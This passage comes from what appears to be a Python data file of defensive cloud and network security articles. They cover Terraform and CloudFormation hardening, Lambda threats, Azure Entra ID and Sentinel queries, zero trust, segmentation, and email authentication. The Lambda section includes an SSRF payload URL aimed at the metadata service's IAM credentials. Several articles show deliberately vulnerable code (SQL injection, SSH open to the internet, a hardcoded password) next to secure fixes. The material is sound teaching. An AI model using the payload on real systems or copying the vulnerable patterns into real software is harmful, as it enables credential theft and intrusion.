# INSECURE: SSH open to internet
resource "aws_security_group_rule" "ssh" {
  type        = "ingress"
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
  security_group_id = aws_security_group.web.id
}

# SECURE: restrict to bastion security group
resource "aws_security_group_rule" "ssh" {
  type                     = "ingress"
  from_port                = 22
  to_port                  = 22
  protocol                 = "tcp"
  source_security_group_id = aws_security_group.bastion.id
  security_group_id        = aws_security_group.web.id
}
```

## Secrets in Terraform

```hcl
# BAD: hardcoded in code and baked into state file
resource "aws_db_instance" "main" {
  password = "SuperSecret123"
}

# BETTER: sensitive variable (still in state)
variable "db_password" {
  type      = string
  sensitive = true   # Redacted from console output
}

# BEST: fetch from Secrets Manager — never in state
data "aws_secretsmanager_secret_version" "db_pw" {
  secret_id = "production/rds/password"
}

resource "aws_db_instance" "main" {
  password = data.aws_secretsmanager_secret_version.db_pw.secret_string
}
```

**Terraform state security**: State files contain all resource attributes including secrets. Always use remote state with encryption:

```hcl
terraform {
  backend "s3" {
    bucket         = "my-tf-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "terraform-locks"
    kms_key_id     = "arn:aws:kms:us-east-1:123456789:key/mrk-xxx"
  }
}
```

## IaC Scanning Tools

```bash
# Checkov: multi-framework, 1000+ checks
checkov -d ./terraform/ --framework terraform
checkov -d . --severity HIGH

# tfsec: Terraform-specific deep analysis
tfsec ./terraform/ --severity HIGH

# Terrascan: policy-as-code
terrascan scan -i terraform -d ./terraform/

# Example finding:
# Check: CKV_AWS_20: S3 bucket ACL should not allow public access
#   FAILED: aws_s3_bucket.data
#   File: main.tf:1-3
```

## CloudFormation Security

```yaml
# Secure CloudFormation pattern
Parameters:
  DBPassword:
    Type: String
    NoEcho: true   # Hidden from console and API output

Resources:
  DataBucket:
    Type: AWS::S3::Bucket
    Properties:
      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: aws:kms
      PublicAccessBlockConfiguration:
        BlockPublicAcls: true
        BlockPublicPolicy: true
        IgnorePublicAcls: true
        RestrictPublicBuckets: true
      VersioningConfiguration:
        Status: Enabled

  DBInstance:
    Type: AWS::RDS::DBInstance
    Properties:
      StorageEncrypted: true
      PubliclyAccessible: false
      MasterUserPassword: !Sub "{{resolve:secretsmanager:prod/db:SecretString:password}}"
    DeletionPolicy: Snapshot
```

```bash
# cfn-lint: CloudFormation linter
cfn-lint template.yaml

# Detect hardcoded secrets in CFn templates
grep -rE "(password|secret|key)\\s*:\\s*[^!]" ./cloudformation/ | grep -v "NoEcho\\|resolve"
```

## CI/CD Security Gates

```yaml
# GitHub Actions: fail PR on critical IaC findings
name: IaC Security
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - name: Checkov
      uses: bridgecrewio/checkov-action@master
      with:
        directory: terraform/
        soft_fail: false
    - name: tfsec
      uses: aquasecurity/tfsec-action@v1.0.0
      with:
        soft_fail: false
```

## Drift Detection

IaC only helps if deployed resources match the templates. Detect configuration drift:

```bash
# Terraform: show what changed outside Terraform
terraform plan -refresh-only

# CloudFormation: detect stack resource drift
aws cloudformation detect-stack-drift --stack-name production
aws cloudformation describe-stack-resource-drifts --stack-name production \\
    --stack-resource-drift-status-filters MODIFIED DELETED
```
""",
    },
    {
        "title": "Serverless Security — Lambda Attack Surface and Monitoring",
        "tags": ["serverless", "lambda", "faas", "cloud-security", "virt-cloud"],
        "content": r"""# Serverless Security — Lambda Attack Surface and Monitoring

## The Serverless Threat Model

```
Event Sources (API GW, S3, SQS, SNS, EventBridge)
      |
  Lambda Function
  +--------------------------------------------------+
  | Function Code + Dependencies   <- attacker target |
  | Environment Variables          <- secrets exposure |
  | IAM Execution Role             <- over-privilege   |
  | /tmp filesystem (512 MB)       <- staging area     |
  +--------------------------------------------------+
  Provider-managed: Runtime, OS, patching, scaling
```

Four main Lambda attack surfaces:
1. **Event injection** — untrusted input from event sources
2. **Dependency CVEs** — vulnerable npm/pip packages
3. **Over-privileged IAM role** — blast radius of compromise
4. **Secrets in environment variables** — visible in console and config APIs

## Event Injection

```python
import re

# VULNERABLE: SQL injection via query parameter
def handler(event, context):
    user_id = event["queryStringParameters"]["user_id"]
    query = f"SELECT * FROM users WHERE id = {user_id}"   # Injection!

# SECURE: validation + parameterised query
def handler(event, context):
    params = event.get("queryStringParameters") or {}
    user_id = params.get("user_id", "")
    if not re.fullmatch(r"[0-9]{1,10}", user_id):
        return {"statusCode": 400, "body": "Invalid user_id"}
    # cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

## SSRF via Lambda

Lambda can reach the Instance Metadata Service, which returns temporary AWS credentials:

```python
import requests, urllib.parse

# DANGEROUS: attacker-controlled URL
def handler(event, context):
    url = event["url"]
    return requests.get(url).text
    # Payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/
    # Returns Lambda's temporary AWS credentials!

# SECURE: strict URL allowlist
ALLOWED_HOSTS = {"api.trusted.com", "data.partner.com"}

def handler(event, context):
    url = event.get("url", "")
    host = urllib.parse.urlparse(url).hostname
    if host not in ALLOWED_HOSTS:
        return {"statusCode": 403, "body": "URL not permitted"}
    return requests.get(url, timeout=5).text
```

## IAM Least Privilege

```bash
# Audit Lambda execution roles
aws lambda list-functions \\
    --query 'Functions[*].{Name:FunctionName,Role:Role}' --output table

# Simulate what a role can do
aws iam simulate-principal-policy \\
    --policy-source-arn arn:aws:iam::123456789:role/my-lambda-role \\
    --action-names "s3:*" "iam:*" "ec2:*" "secretsmanager:*" \\
    --query 'EvaluationResults[?EvalDecision==`allowed`].EvalActionName'
```

```json
// Minimum policy for a Lambda reading one S3 bucket
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::my-input-bucket/*"
    },
    {
      "Effect": "Allow",
      "Action": ["logs:CreateLogGroup","logs:CreateLogStream","logs:PutLogEvents"],
      "Resource": "arn:aws:logs:*:*:*"
    }
  ]
}
```

## Secrets Management

```python
import boto3, json, os

# BAD: visible in console and config API
DB_PASSWORD = os.environ["DB_PASSWORD"]

# GOOD: fetch from Secrets Manager, cache across warm invocations
_cache = {}

def get_secret(name: str) -> dict:
    if name not in _cache:
        sm = boto3.client("secretsmanager")
        _cache[name] = json.loads(sm.get_secret_value(SecretId=name)["SecretString"])
    return _cache[name]

def handler(event, context):
    creds = get_secret("production/myapp/database")
    # Use creds["password"]
```

## Monitoring

```bash
# CloudWatch Logs: all Lambda output goes here automatically
aws logs tail /aws/lambda/myfunction --follow

# Find errors in last hour
aws logs filter-log-events \\
    --log-group-name /aws/lambda/myfunction \\
    --start-time $(date -d '1 hour ago' +%s000) \\
    --filter-pattern "ERROR"

# Enable X-Ray distributed tracing
aws lambda update-function-configuration \\
    --function-name myfunction \\
    --tracing-config Mode=Active

# CloudTrail: Lambda-specific events to monitor
# CreateFunction       -- new code deployed
# UpdateFunctionCode   -- code changes (potential backdoor)
# AddPermission        -- new invocation source allowed
# GetFunction          -- code downloaded (data theft risk)
aws cloudtrail lookup-events \\
    --lookup-attributes AttributeKey=EventSource,AttributeValue=lambda.amazonaws.com \\
    --start-time "$(date -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ)" \\
    --query 'Events[*].{Time:EventTime,Event:EventName,User:Username}'
```

## Security Hardening Checklist

```
[ ] Execution role uses least privilege — no Action:* or Resource:*
[ ] No secrets in environment variables — use Secrets Manager or SSM
[ ] All event inputs validated before use
[ ] Dependencies scanned for CVEs (pip-audit, npm audit, Snyk)
[ ] Reserved concurrency set to prevent runaway scaling
[ ] VPC deployment for functions accessing private resources
[ ] X-Ray tracing enabled
[ ] CloudWatch alarms on error rate and throttles
[ ] Resource policy restricts InvokeFunction to specific sources only
```
""",
    },
    {
        "title": "Azure Security Fundamentals — Entra ID, NSGs, and Defender for Cloud",
        "tags": ["azure", "entra-id", "nsg", "defender", "cloud-security", "virt-cloud"],
        "content": r"""# Azure Security Fundamentals — Entra ID, NSGs, and Defender for Cloud

## Azure Entra ID (formerly Azure Active Directory)

Entra ID is Azure's cloud identity platform — authentication and authorisation for all Microsoft cloud services.

### Core Concepts

**Managed Identities** — Service principals automatically managed by Azure. No credentials to rotate, no secrets to leak. Use for all Azure-hosted workloads.

**Conditional Access** — Policy engine evaluating user, device, location, and sign-in risk before granting an access token.

**Privileged Identity Management (PIM)** — Just-in-time privileged access. Admin roles are time-limited, require approval, and generate audit events.

**Identity Protection** — ML-based risk scoring for sign-ins and users. Automatically blocks high-risk sign-ins or requires MFA step-up.

### Identity Security Auditing

```bash
# Find guest (external) users
az ad user list --filter "userType eq 'Guest'" \\
    --query '[*].{UPN:userPrincipalName,Created:createdDateTime}' -o table

# Service principals with credentials expiring soon
az ad sp list --all \\
    --query '[*].{Name:displayName,Creds:passwordCredentials[?endDateTime<`2026-07-01`].endDateTime}' \\
    -o table

# Check MFA registration (requires MS Graph)
az rest --method GET \\
    --uri "https://graph.microsoft.com/v1.0/reports/credentialUserRegistrationDetails" \\
    --query "value[?isMfaRegistered==false].userPrincipalName"
```

### Entra ID Attack Patterns

**Password Spray** — Low per-account attempt count across many accounts from one IP.
```
Detection: SigninLogs where ResultType != 0
           Group by IPAddress, count distinct UserPrincipalName
           Alert: >10 distinct accounts failing from one IP in 10 minutes
```

**Token Theft / Pass-the-Token** — Stealing OAuth access tokens to bypass MFA entirely.
```
Detection: Impossible Travel (two different countries within 1 hour)
           Entra ID Identity Protection raises this as a risk detection
```

**Consent Phishing** — Trick user into granting OAuth permissions to attacker-controlled app.
```
Detection: New enterprise applications with Mail.Read or Files.ReadWrite scopes
           Review: Entra ID > Enterprise Applications > All Applications
           Filter by creation date for recently added apps
```

## Network Security Groups (NSGs)

NSGs are stateful packet filters applied at the subnet or NIC level.

```
Rule example:
Priority | Port | Protocol | Source         | Destination | Action
100        443    TCP        Internet         *              Allow
200        22     TCP        10.10.10.0/24    *              Allow
65500      *      *          *                *              Deny  (implicit)
```

```bash
# Find NSGs allowing SSH/RDP from internet
az network nsg list --query '
[*].{NSG:name,RDP_SSH_Open:securityRules[?
    access==`Allow` && direction==`Inbound` &&
    (destinationPortRange==`22` || destinationPortRange==`3389`) &&
    (sourceAddressPrefix==`*` || sourceAddressPrefix==`Internet`)
].destinationPortRange}' -o json

# Enable NSG Flow Logs (version 2 includes throughput)
STORAGE_ID=$(az storage account show -n mystorageacct -g myRG --query id -o tsv)
az network watcher flow-log create \\
    -g myRG -n myFlowLog \\
    --nsg myNSG \\
    --storage-account $STORAGE_ID \\
    --enabled true --format JSON --log-version 2
```

## Microsoft Defender for Cloud

Defender for Cloud provides CSPM and workload protection across Azure, AWS, and GCP.

**Secure Score** — Percentage of security controls implemented. Target >80%.

**Defender Plans:**
- **Defender for Servers** — EDR (MDE), vulnerability assessment, JIT VM access
- **Defender for Storage** — Malware scanning on blob upload, anomaly detection
- **Defender for SQL** — Advanced threat detection, data classification
- **Defender for Containers** — Kubernetes security posture, runtime threats
- **Defender for Key Vault** — Unusual access pattern alerts

```bash
# View Secure Score
az security secure-scores list \\
    --query '[*].{Score:properties.score.current,Max:properties.score.max}' -o table

# List high-severity recommendations
az security assessment list \\
    --query '[?properties.status.code==`Unhealthy` && properties.metadata.severity==`High`].displayName' \\
    -o tsv

# View security alerts
az security alert list \\
    --query '[*].{Name:name,Sev:properties.severity,Time:properties.timeGeneratedUtc,Desc:properties.description}' \\
    -o table

# Enable Defender plans
az security pricing create --name VirtualMachines --tier Standard
az security pricing create --name SqlServers --tier Standard
az security pricing create --name StorageAccounts --tier Standard
```

## Microsoft Sentinel (Azure SIEM/SOAR)

Sentinel uses KQL for detection and hunting:

```kql
// Brute force then success
let failures = SigninLogs
| where TimeGenerated > ago(1h)
| where ResultType != "0"
| summarize FailCount=count() by UserPrincipalName, IPAddress
| where FailCount > 10;
let successes = SigninLogs
| where TimeGenerated > ago(1h)
| where ResultType == "0"
| project UserPrincipalName, IPAddress, TimeGenerated;
failures | join kind=inner successes on UserPrincipalName
| project UserPrincipalName, IPAddress, FailCount

// Admin role assigned
AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName == "Add member to role"
| where TargetResources[0].modifiedProperties[0].newValue contains "Global Administrator"
| project TimeGenerated,
          InitiatedBy=tostring(InitiatedBy.user.userPrincipalName),
          TargetUser=tostring(TargetResources[0].userPrincipalName)

// Resource deletions in Azure Activity Log
AzureActivity
| where TimeGenerated > ago(24h)
| where OperationNameValue contains "delete"
| where ActivityStatusValue == "Success"
| project TimeGenerated, Caller, OperationNameValue, ResourceGroup
| order by TimeGenerated desc
```
""",
    },
]


SECURITY_ARCHITECTURE = [
    {
        "title": "Zero Trust Architecture — Principles, Implementation, and Monitoring",
        "tags": ["zero-trust", "architecture", "security", "identity", "microsegmentation"],
        "content": """# Zero Trust Architecture — Principles, Implementation, and Monitoring

## The Zero Trust Premise

"Never trust, always verify." Traditional perimeter security assumed everything inside the network was trustworthy — once past the firewall, lateral movement was easy. Zero Trust eliminates implicit trust regardless of network location.

The three core principles:
1. **Verify explicitly** — Authenticate and authorise every access request using all available signals
2. **Use least privilege access** — Limit access to the minimum required, just-in-time
3. **Assume breach** — Design as if attackers are already inside; minimise blast radius

## Zero Trust Pillars

```
+-------------------+  +-------------------+  +-------------------+
|    IDENTITY       |  |    DEVICES        |  |   APPLICATIONS    |
| - Strong authN    |  | - Health checks   |  | - App-level authZ |
| - MFA everywhere  |  | - Compliance req  |  | - API security    |
| - Least privilege |  | - Device trust    |  | - Session control |
+-------------------+  +-------------------+  +-------------------+
         |                      |                      |
         +----------+-----------+----------+-----------+
                    |                      |
         +-------------------+  +-------------------+
         |    NETWORK        |  |      DATA         |
         | - Microsegment    |  | - Classification  |
         | - Encrypt transit |  | - DLP             |
         | - No implicit     |  | - Encryption      |
         |   trust by VLAN   |  |   at rest         |
         +-------------------+  +-------------------+
```

## Zero Trust vs Traditional Perimeter

| Dimension | Traditional Perimeter | Zero Trust |
|-----------|----------------------|------------|
| Trust model | Trust by network location | Trust nothing by default |
| Lateral movement | Easy once inside | Requires re-authentication per resource |
| VPN | Full tunnel to network | Specific application access only |
| Identity | AD username/password | MFA + device health + risk score |
| Monitoring | Perimeter logs | Per-request logs for every resource |
| Breach assumption | Perimeter holds | Already breached — minimise impact |

## Implementation with Microsoft Entra ID + Conditional Access

Conditional Access is a practical Zero Trust enforcement point:

```
Access Request
      |
  Entra ID evaluates signals:
  - Who is the user?
  - What device are they on? (compliance, join type)
  - Where are they? (location, IP risk)
  - What are they accessing?
  - Risk score (Identity Protection)
      |
  Policy decision:
  - Allow
  - Allow + require MFA
  - Allow + require compliant device
  - Block
```

```bash
# Azure CLI: list Conditional Access policies
az rest --method GET \\
    --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \\
    --query "value[*].{Name:displayName,State:state}" -o table

# Key policies to implement:
# 1. Require MFA for all users (with exclusion for break-glass account)
# 2. Block legacy authentication (SMTP, IMAP, POP3 — bypass MFA)
# 3. Require compliant device for sensitive apps
# 4. Block sign-ins from high-risk locations
# 5. Require MFA for admin roles always
```

## Zero Trust Network Access (ZTNA)

ZTNA replaces VPN with application-specific access:

```
Traditional VPN:          ZTNA:
User --> VPN tunnel       User --> ZTNA proxy
         |                          |
    Full network           Specific application only
    access to all          Authenticated + authorised
    internal resources     per-request
    No per-app auth        Full audit trail
```

**Tools:** Cloudflare Access, Zscaler Private Access, BeyondCorp (Google), Netskope Private Access.

```
ZTNA Connector deployment (conceptual):
Internal App Server <-- Outbound connector --> ZTNA Cloud
                                                    ^
User Device (verified identity + device) ----------+
```

The internal connector makes outbound connections only — no inbound firewall rules needed.

## Microsegmentation

Zero Trust at the network layer: every host-to-host communication is authorised.

```bash
# Linux: iptables microsegmentation example
# Allow only specific sources to reach an app
iptables -A INPUT -s 10.0.2.0/24 -p tcp --dport 8080 -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -j DROP    # Drop everything else

# Kubernetes NetworkPolicy (see Kubernetes article for full detail)
# Windows: Windows Firewall per-process rules
New-NetFirewallRule -DisplayName "App-to-DB Only" \\
    -Direction Inbound -Protocol TCP -LocalPort 5432 \\
    -RemoteAddress 10.0.2.0/24 -Action Allow
```

## Zero Trust Monitoring Requirements

Zero Trust increases the security event volume because every access request generates a log:

```bash
# Key logs to centralise for Zero Trust:
# 1. Identity provider: all sign-ins (success and failure), MFA events
# 2. Device management (Intune/JAMF): compliance state changes
# 3. ZTNA proxy: every application access request
# 4. Microsegmentation: allowed + denied east-west traffic
# 5. Data access: every sensitive file/DB read

# Key Zero Trust detection rules:
# - MFA bypass attempt (legacy auth protocol after CA block)
# - Device compliance status changed to non-compliant mid-session
# - Impossible travel (two sign-ins from different countries in < 1h)
# - Service account accessing resource outside normal pattern
# - User accessing application never accessed before (first-time access)
```

## Zero Trust Maturity Model (CISA)

CISA defines five Zero Trust pillars with Traditional → Initial → Advanced → Optimal maturity levels:

```
Pillar          Traditional                   Optimal
-------         -----------                   -------
Identity        Password auth                 Continuous risk assessment
Devices         Network-joined only           Fully managed, health-attested
Networks        VLAN segmentation             Microsegmented, encrypted east-west
Apps            VPN to access                 Per-app ZTNA, inline inspection
Data            Perimeter-protected           Tagged, encrypted, DLP everywhere
```

Most organisations implementing Zero Trust should target **Advanced** level across all pillars as a realistic goal.
""",
    },
    {
        "title": "Network Segmentation Design — DMZ, VLANs, and Microsegmentation",
        "tags": ["network-segmentation", "dmz", "vlan", "microsegmentation", "architecture"],
        "content": """# Network Segmentation Design — DMZ, VLANs, and Microsegmentation

## Why Segmentation Matters

Network segmentation limits lateral movement. When an attacker compromises a single host, segmentation forces them to break through additional boundaries to reach high-value assets. Without segmentation, one compromised laptop can reach the domain controller directly.

## The Classic DMZ

A DMZ (Demilitarised Zone) is a network segment sitting between the internet and the internal network, holding services that must be internet-accessible.

```
Internet
    |
[Perimeter Firewall]
    |
  DMZ (10.0.1.0/24)
  - Web servers
  - Reverse proxies
  - Email gateways
  - VPN concentrators
    |
[Internal Firewall]
    |
Internal Network (10.0.0.0/8)
  - Domain controllers
  - File servers
  - Workstations
  - Databases
```

**Firewall rules (concept):**
- Internet → DMZ: allow TCP 80, 443 to web servers only
- DMZ → Internet: allow established connections (responses)
- DMZ → Internal: allow only the minimum needed (e.g., DB queries from web servers to DB server on port 3306)
- Internal → DMZ: restrict (internal users should not initiate connections to DMZ)
- Internal → Internet: via proxy or NAT

## VLAN-Based Segmentation

VLANs (Virtual LANs) segment a physical network into multiple logical networks at Layer 2.

```
Switch Trunk Port (carries all VLANs)
    |
+---+--------+
| VLAN 10    | 10.0.10.0/24 — Servers
| VLAN 20    | 10.0.20.0/24 — Workstations
| VLAN 30    | 10.0.30.0/24 — IoT/OT devices
| VLAN 40    | 10.0.40.0/24 — Guest WiFi
| VLAN 99    | 10.0.99.0/24 — Management (OOB)
+------------+
```

**VLAN security limitations:**
- VLANs are a Layer 2 boundary — a Layer 3 router (or a firewall) is needed to control inter-VLAN traffic
- VLAN hopping attacks (double-tagging) can bypass VLAN boundaries on misconfigured trunk ports
- VLANs don't stop intra-VLAN lateral movement (host-to-host within the same VLAN)

```
Cisco switch: VLAN hopping prevention
switchport mode access                # Not trunk — access ports only
switchport nonegotiate                # Disable DTP
switchport trunk native vlan 999      # Change native VLAN from default 1
no switchport trunk allowed vlan 1    # Remove VLAN 1 from all trunks
```

## Recommended Segmentation Zones

| Zone | Contents | Trust Level | Controls |
|------|----------|-------------|---------|
| Internet | External users, partners | Untrusted | Perimeter firewall, DDoS |
| DMZ | Web servers, proxies, email | Semi-trusted | WAF, IPS, strict egress |
| Workstations | User endpoints | Low-medium | EDR, proxy, DNS filter |
| Servers | App/file/print servers | Medium | Host FW, AV, no internet |
| Database | Databases | High | Port-specific access only |
| Management | Admin consoles, IPMI, OOB | High | Jump servers, MFA, logging |
| OT/IoT | Operational technology | Isolated | Unidirectional gateway |
| Guest | Visitor WiFi | Untrusted | Internet only, no internal |

## Microsegmentation

Microsegmentation applies firewall rules at the individual workload level — every VM, container, or process is its own security zone.

```
Traditional VLAN segmentation:
[Workstation VLAN] <-- one firewall rule controls ALL workstations -->

Microsegmentation:
[Workstation A] <-- own rules, can only reach: web proxy:443, DNS:53, LDAP:389
[Workstation B] <-- own rules, can only reach: web proxy:443, DNS:53
[Finance PC]    <-- own rules, adds: finance-app-server:8443
```

**Implementation approaches:**

**VMware NSX** — Distributed firewall at the hypervisor level. Rules travel with VMs regardless of physical placement.

**Illumio, Guardicore, Cisco Tetration** — Agent-based, application-aware microsegmentation.

**Cloud security groups** — AWS security groups applied per-ENI provide native microsegmentation.

**Linux iptables/nftables** — Host-based firewall rules for workload-level segmentation.

```bash
# Linux: minimal host-based microsegmentation
# Allow only necessary inbound ports; drop everything else
iptables -F                                    # Flush existing rules
iptables -P INPUT DROP                         # Default deny inbound
iptables -P FORWARD DROP                       # Default deny forward
iptables -P OUTPUT ACCEPT                      # Allow all outbound (tighten later)
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  # Allow responses
iptables -A INPUT -i lo -j ACCEPT              # Allow loopback
iptables -A INPUT -s 10.0.99.0/24 -p tcp --dport 22 -j ACCEPT  # SSH from mgmt only
iptables -A INPUT -p tcp --dport 8443 -j ACCEPT  # App port

# Save rules
iptables-save > /etc/iptables/rules.v4
```

## Segmentation Testing

```bash
# Verify a host CANNOT reach resources it shouldn't
# From workstation (should fail):
nc -zv database-server.internal 5432 2>&1
curl -I http://finance-app.internal:8443 --max-time 3

# From jump server (should succeed):
nc -zv database-server.internal 5432 2>&1

# Nmap from attacker perspective (what can this host reach?)
nmap -sT -p 1-65535 --open -T2 10.0.10.0/24 2>/dev/null | grep -E "open|report"

# Check firewall rules on the host
iptables -L -n -v   # Linux
netsh advfirewall show allprofiles   # Windows
```

## East-West Traffic Monitoring

After segmentation, monitor the allowed traffic for anomalies:

```bash
# Capture east-west traffic for analysis
tcpdump -i any -w /tmp/eastwest.pcap 'not port 22 and not port 443'

# Baseline: what connections does this host normally make?
ss -tn state established | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn

# Alert on first-time lateral connections (new source/dest pairs)
# This requires a baseline and comparison — typically done in a SIEM
# Elastic KQL: connections where destination.ip has not appeared in past 30 days
```
""",
    },
    {
        "title": "Secure Email Architecture — SPF, DKIM, DMARC Configuration and Verification",
        "tags": ["email-security", "spf", "dkim", "dmarc", "phishing", "architecture"],
        "content": """# Secure Email Architecture — SPF, DKIM, DMARC Configuration and Verification

## Why Email Authentication Matters

Email is the top initial access vector. SPF, DKIM, and DMARC are three complementary DNS-based controls that together prevent domain spoofing — the technique used in business email compromise (BEC) and spear-phishing.

## SPF — Sender Policy Framework

SPF declares which mail servers are authorised to send email for a domain. It is published as a DNS TXT record.

```dns
# Example SPF record for corp.com
corp.com.  IN  TXT  "v=spf1 mx include:spf.google.com ip4:203.0.113.1 -all"
```

**Mechanisms:**
- `mx` — include the domain's MX records as authorised senders
- `include:spf.google.com` — include Google's SPF range (for Google Workspace)
- `ip4:203.0.113.1` — specific IP authorised to send
- `-all` — hard fail: anything not listed is rejected

**Qualifiers:**
- `+` (default) = Pass
- `-` = Fail (reject)
- `~` = SoftFail (accept but mark as suspicious)
- `?` = Neutral

```bash
# Check SPF record
dig TXT corp.com | grep spf
nslookup -type=TXT corp.com

# Test SPF via command line (requires pyspf or similar)
python3 -c "import spf; print(spf.check2('203.0.113.1', 'user@corp.com', 'corp.com'))"
```

**SPF limitations:**
- SPF only checks the `Mail From` (envelope sender), not the `From:` header visible to users
- SPF breaks when email is forwarded (the forwarding server's IP fails SPF for the original domain)

## DKIM — DomainKeys Identified Mail

DKIM adds a cryptographic signature to outgoing email. The receiving server verifies the signature using a public key in DNS.

```
Sending:
  Mail Server signs email headers + body with private key
  Adds: DKIM-Signature: v=1; a=rsa-sha256; d=corp.com; s=mail; b=<signature>

Receiving:
  Looks up: mail._domainkey.corp.com TXT  --> gets public key
  Verifies signature matches email content
  If tampered in transit --> signature fails
```

```dns
# DKIM public key DNS record
mail._domainkey.corp.com.  IN  TXT  "v=DKIM1; k=rsa; p=MIGfMA0GCS..."
```

```bash
# Check DKIM record
dig TXT mail._domainkey.corp.com
nslookup -type=TXT mail._domainkey.corp.com

# Verify DKIM signature in an email (check raw headers)
# Authentication-Results: mx.example.com;
#        dkim=pass header.i=@corp.com header.s=mail header.b=AbCdEfGh
```

**DKIM covers:** The content integrity of the message and the signing domain. It survives forwarding (signature travels with the email).

## DMARC — Domain-based Message Authentication, Reporting and Conformance

DMARC tells receiving servers what to do when SPF or DKIM fails, and requests aggregate/forensic reports.

```dns
# DMARC record
_dmarc.corp.com.  IN  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc-reports@corp.com; pct=100"
```

**Policy values:**
- `p=none` — Monitor only, no action taken
- `p=quarantine` — Suspicious email goes to spam/junk
- `p=reject` — Outright reject emails that fail (strongest protection)

**Alignment:** DMARC requires the `From:` header domain to align with either the SPF `Mail From` domain or the DKIM signing domain. This closes the loophole that SPF alone leaves.

**DMARC reports:**
- `rua=` — Aggregate reports (daily XML summary from each receiving server)
- `ruf=` — Forensic reports (individual failed message reports)

```bash
# Check DMARC
dig TXT _dmarc.corp.com
nslookup -type=TXT _dmarc.corp.com

# Parse DMARC aggregate report (XML)
python3 - << 'EOF'
import xml.etree.ElementTree as ET
tree = ET.parse('dmarc_report.xml')
root = tree.getroot()
for record in root.findall('.//record'):
    ip = record.find('row/source_ip').text
    count = record.find('row/count').text
    spf = record.find('row/policy_evaluated/spf').text
    dkim = record.find('row/policy_evaluated/dkim').text
    print(f"IP: {ip}, Count: {count}, SPF: {spf}, DKIM: {dkim}")
EOF
```

## Implementation Sequence

Deploy in this order to avoid breaking legitimate email:

```
Step 1: Inventory all sending sources (mail servers, marketing tools, third parties)
Step 2: Publish SPF with ~all (softfail) while auditing
Step 3: Enable DKIM signing on all outbound paths
Step 4: Publish DMARC p=none with rua= reporting address
Step 5: Review reports for 2-4 weeks — identify all legitimate sources
Step 6: Add missing sources to SPF/DKIM
Step 7: Move DMARC to p=quarantine, pct=10 (10% of failures quarantined)
Step 8: Increase pct gradually: 25 --> 50 --> 75 --> 100
Step 9: Move to p=reject when false positive rate is acceptable
```

## Verification and Testing

```bash
# Complete email security check
# 1. SPF
dig TXT yourdomain.com | grep "v=spf1"

# 2. DKIM (replace 'mail' with your selector)
dig TXT mail._domainkey.yourdomain.com

# 3. DMARC
dig TXT _dmarc.yourdomain.com

# 4. Send test emails
# MXToolbox: https://mxtoolbox.com/EmailHeaders.aspx
# Mail-tester: https://www.mail-tester.com
# Google's Check MX: https://toolbox.googleapps.com/apps/checkmx/

# 5. Check authentication results in email headers
# Receive a test email, view raw headers:
# Authentication-Results: mx.google.com;
#        spf=pass (google.com: domain of sender@yourdomain.com designates 203.0.113.1)
#        dkim=pass header.i=@yourdomain.com
#        dmarc=pass (p=REJECT) header.from=yourdomain.com
```

## Incident Response: Email Spoofing Investigation

```bash
# Investigate a suspected spoofed email
# 1. Extract headers from the email (full headers, not display view)

# 2. Trace the sending path (Received: headers, read bottom-up)

# 3. Check SPF result
# Authentication-Results: ...
# spf=fail (203.0.113.200 is not permitted by domain of corp.com)

# 4. Look up the sending IP
whois 203.0.113.200
# AbuseIPDB check
curl "https://api.abuseipdb.com/api/v2/check?ipAddress=203.0.113.200" \\
    -H "Key: YOUR_API_KEY"

# 5. Check if DMARC would have blocked it
# Look at dmarc= result in Authentication-Results
# If p=none, it passed even with spoofed From: header
```
""",
    },
    {
        "title": "Logging Architecture — Centralised Logging and SIEM Pipeline Design",
        "tags": ["logging", "siem", "architecture", "elk", "log-pipeline", "detection"],
        "content": """# Logging Architecture — Centralised Logging and SIEM Pipeline Design

## Why Logging Architecture is a Security Concern

Poor logging architecture creates detection blind spots. Analysts can only detect what is logged, and can only investigate with logs that have been retained. Log pipeline design is as important as the detection rules themselves.

## The Log Pipeline

```
Log Sources          Collection         Processing        Storage         Analysis
+-----------+        +--------+         +--------+        +--------+      +--------+
| Firewalls |        |        |         |        |        |        |      |        |
| Endpoints | -----> | Agents | ------> | Parser | -----> | Index  | ---> |  SIEM  |
| Servers   |        | (Beat/ |         | (Logst-|        | (ES,   |      | Rules  |
| Cloud API |        | Cribl) |         | ash)   |        | Splunk)|      | Hunt   |
| Auth logs |        |        |         |        |        |        |      | Alerts |
+-----------+        +--------+         +--------+        +--------+      +--------+
```

## Log Source Priority

Not all logs are equal. Prioritise by detection value:

| Priority | Source | Why |
|----------|--------|-----|
| P1 | Identity provider (Entra ID, Okta) | Authentication is the foundation |
| P1 | EDR (Defender, CrowdStrike) | Process/file/network telemetry |
| P1 | Firewall / NGFW | Network perimeter visibility |
| P1 | DNS resolver | C2 beaconing, DGA detection |
| P2 | Web proxy | User web traffic, malware downloads |
| P2 | Email gateway | Phishing, malicious attachments |
| P2 | Cloud audit logs (CloudTrail, Activity Log) | Cloud API actions |
| P2 | VPN / ZTNA | Remote access context |
| P3 | Windows Event Log | Process creation, logons (can be high volume) |
| P3 | Linux syslog / journald | Auth, cron, service events |
| P4 | Application logs | Business logic, auth in apps |

## Log Normalisation — ECS and Common Event Format

Logs arrive in dozens of formats. Normalisation maps them to a common schema:

**Elastic Common Schema (ECS)** — used by Elastic SIEM:
```json
{
  "@timestamp": "2026-03-15T14:30:00.000Z",
  "event": {
    "action": "authentication_failure",
    "category": ["authentication"],
    "type": ["start"],
    "outcome": "failure"
  },
  "user": {
    "name": "jsmith",
    "domain": "CORP"
  },
  "source": {
